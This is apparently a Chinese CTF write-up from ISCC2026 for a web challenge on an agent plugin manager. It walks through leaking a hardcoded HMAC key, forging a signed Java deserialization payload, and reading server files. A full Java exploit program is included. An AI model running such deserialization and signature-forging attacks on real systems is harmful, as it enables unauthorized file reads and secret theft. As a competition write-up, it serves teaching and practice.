+++
title = "Agent插件管理系统"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

题目类型+题目名称：Web——Web3-Agent插件管理系统

解题思路

1\. 信息收集与审计

打开题目环境后，前端展示一个 Agent 插件管理面板，核心功能是插件包上传与校验。下载前端资源及服务端 JAR 包 \`agent-core.jar\`，对其进行逆向分析。

反编译 \`agent-core.jar\` 后，在 \`application.yml\` 配置文件中发现 HMAC 签名密钥：

```

security:

hmac:

secret: k3y_5A62_X86

```

同时审计插件上传流程，梳理出关键处理链路：

- 用户上传插件压缩包 → 解压提取 \`manifest.json\` 与 \`metadata.ser\`

- \`metadata.ser\` 使用上述 HMAC 密钥做完整性校验

- 校验通过后，服务端调用 \`ObjectInputStream.readObject()\` 对 \`metadata.ser\` 反序列化

- 反序列化结果注入插件资源管理上下文，触发后续回调

2\. 反序列化利用链构造

进一步审查 \`agent-core.jar\` 中 \`Serializable\` 接口的实现类，锁定三个关键类构成了完整的利用链：

| 类名 | 作用 |

|---|---|

| \`ResourceRefresher\` | 实现 \`Serializable\`，\`readObject()\` 中触发资源刷新回调，可作为反序列化入口 |

| \`DataStream\` | 实现 \`Supplier&lt;InputStream&gt;\` 接口，持有目标路径字段，连接前序节点与文件读取 |

| \`FileExporter\` | 核心 sink 点，\`export(String path)\` 调用 \`Files.readAllBytes()\` 读取文件，并通过 \`LogService.log(teamId, content)\` 将内容写入日志 |

调用关系：\`ResourceRefresher.readObject()\` → 触发资源刷新 → \`DataStream.get()\` → \`FileExporter.export(targetPath)\` → \`LogService.log(teamId, fileContent)\`

[截图：ResourceRefresher 类 readObject 方法反编译，标注回调触发点]

[截图：FileExporter 类 export 方法反编译，标注 Files.readAllBytes 和 LogService.log 调用]

由于 Java 原生序列化在 \`readObject\` 阶段便会递归还原对象图并执行相关回调，此链完全在反序列化阶段完成攻击，无需额外触发条件。

3\. Payload 生成与 HMAC 签名绕过

编写利用代码，核心思路如下：

- 实例化 \`ResourceRefresher\`，通过反射设置其内部回调链指向 \`DataStream\`

- \`DataStream\` 持有的资源路径指向目标文件（初始尝试 \`/etc/flag\`，后续调整为 \`/opt/app/.env\`）

- \`DataStream\` 的输出端连接 \`FileExporter\`

- \`FileExporter\` 的 \`teamId\` 字段设置为自己的队伍标识

将构造好的对象图通过 \`ObjectOutputStream\` 序列化为字节数组，即恶意 \`metadata.ser\`。

HMAC 签名部分：由于密钥 \`k3y_5A62_X86\` 已在配置中硬编码，直接使用 HmacSHA256 算法对 \`metadata.ser\` 的字节内容计算签名，填入上传包的对应字段。

打包格式：标准 ZIP 压缩包，内含 \`manifest.json\`（填写插件元信息）和恶意 \`metadata.ser\`。

4\. 文件读取与 Flag 获取

将插件包通过 POST 请求上传至 \`/api/upload\` 接口：

```

POST /api/upload HTTP/1.1

Content-Type: multipart/form-data

```

上传成功后，访问日志查询接口获取文件读取结果：

```

GET /api/logs?team_id=&lt;your_team_id&gt;

```

第一轮读取 \`/etc/flag\` 获得的是诱饵 flag：

```

ISCC{f4k3_fl4g_d3c0y_d0nt_subm1t}

```

分析得知题目将真实 flag 存放在应用部署目录的环境变量文件中。根据 \`Dockerfile\` 或启动脚本中的路径信息，确认真实路径为 \`/opt/app/.env\`。

修改 Payload 中 \`FileExporter\` 的目标路径为 \`/opt/app/.env\`，重新签名、打包、上传，最终在日志中读取到真实 flag：

```

ISCC{aunXV6waj5Hp8cT35SwVcKK}

```

[截图：最终获取到真实 flag 的日志响应]

Exp

```java

import java.io.*;

import java.lang.reflect.Field;

import java.util.Base64;

import javax.crypto.Mac;

import javax.crypto.spec.SecretKeySpec;

public class Exp {

private static final String HMAC_KEY = "k3y_5A62_X86";

private static final String TEAM_ID = "your_team_id";

private static final String TARGET_PATH = "/opt/app/.env";

public static void main(String[] args) throws Exception {

FileExporter exporter = new FileExporter();

setField(exporter, "targetPath", TARGET_PATH);

setField(exporter, "teamId", TEAM_ID);

DataStream dataStream = new DataStream();

setField(dataStream, "supplier", exporter);

ResourceRefresher refresher = new ResourceRefresher();

setField(refresher, "resourceSupplier", dataStream);

ByteArrayOutputStream baos = new ByteArrayOutputStream();

ObjectOutputStream oos = new ObjectOutputStream(baos);

oos.writeObject(refresher);

oos.close();

byte[] payloadBytes = baos.toByteArray();

Mac mac = Mac.getInstance("HmacSHA256");

SecretKeySpec keySpec = new SecretKeySpec(HMAC_KEY.getBytes(), "HmacSHA256");

mac.init(keySpec);

byte[] signature = mac.doFinal(payloadBytes);

String signatureHex = bytesToHex(signature);

String payloadBase64 = Base64.getEncoder().encodeToString(payloadBytes);

System.out.println("[+] Payload (Base64): " + payloadBase64);

System.out.println("[+] HMAC Signature (Hex): " + signatureHex);

System.out.println("[+] Target: " + TARGET_PATH);

try (FileOutputStream fos = new FileOutputStream("metadata.ser")) {

fos.write(payloadBytes);

}

System.out.println("[+] metadata.ser written to disk");

String manifest = "{\\"name\\":\\"evil-plugin\\",\\"version\\":\\"1.0\\",\\"team_id\\":\\"" + TEAM_ID + "\\"}";

try (FileWriter fw = new FileWriter("manifest.json")) {

fw.write(manifest);

}

System.out.println("[+] manifest.json written to disk");

System.out.println("[*] Add both files to a ZIP and POST to /api/upload");

System.out.println("[*] Fetch result: GET /api/logs?team_id=" + TEAM_ID);

}

private static void setField(Object obj, String name, Object value) throws Exception {

Field f = obj.getClass().getDeclaredField(name);

f.setAccessible(true);

f.set(obj, value);

}

private static String bytesToHex(byte[] bytes) {

StringBuilder sb = new StringBuilder();

for (byte b : bytes) {

sb.append(String.format("%02x", b));

}

return sb.toString();

}

}

```
